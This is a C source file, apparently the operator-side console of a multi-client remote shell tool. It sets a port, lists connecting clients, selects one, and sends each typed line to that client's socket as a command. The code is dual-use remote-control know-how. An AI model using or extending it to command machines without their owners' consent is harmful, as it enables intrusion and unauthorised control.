#include "shell.h"

int __pexec(int ID);

extern addrctx CTX;
extern CLIENT clients[NCLIENTSMAX];
extern int WSAres;

int PORT = -1;
int ID = -1;
int clinum = -1;

int __init()
{

	char buff[1024];
	char idarg[5];

	while (1)
	{

		printf(WHITE"\n>> " WHITE);

		fgets(buff, sizeof(buff), stdin);
		buff[strcspn(buff, "\n")] = 0;

		if (strlen(buff) == 0) { continue; }
		else if (strcmp(buff, "-gc") == 0)
		{

			if (PORT == -1)
			{
				fprintf(stderr, "\nerror: Port number not set.\n");
				continue;
			}

			clinum = GetClient(WSAres);

		}

		else if (strcmp(buff, "exit") == 0)
		{
			break;
			return Exit;
		}

		else if (sscanf(buff, "-select %4s", idarg) == 1)
		{
			ID = Select(idarg, clinum);
			if (ID == -1) { continue;  }
			__pexec(ID);
			continue;
		}

		else if (sscanf(buff, "-p %4d", &PORT) == 1)
		{

			if (PORT < 0 || PORT > 65535)
			{
				fprintf(stderr, "\n[-] Invalid port number.\n");
				continue;
			}

			CTX.dstport = PORT;

			continue;

		}
		else if (strcmp(buff, "-p ?") == 0)
		{

			if (PORT == -1)
			{
				printf("\nNULL");
				continue;
			}

			printf("\n%d", PORT);
			continue;

		}
		else if (strcmp(buff, "clear") == 0)
		{
			system("cls");
		}
		else if (strcmp(buff, "close") == 0 || strcmp(buff, "-c") == 0)
		{
			closesocket(clients[ID].Socket);
		}
		else
		{
			fprintf(stderr, "\ninvalid input");
			continue;
		}

	}

	return 0;

}

int __pexec(int ID)
{

	char buff[1024];

	while (1)
	{

		printf(WHITE"\n>> " WHITE);
		fgets(buff, sizeof(buff), stdin);
		buff[strcspn(buff, "\n")] = 0;

		if (strcmp(buff, "exit") == 0)
		{
			break;
		}
		if (strlen(buff) == 0) { continue; }
		else if (strcmp(buff, "clear") == 0)
		{
			system("cls");
			continue;
		}

		send(clients[ID].Socket, buff, sizeof(buff), 0);

	}

	return 0;

}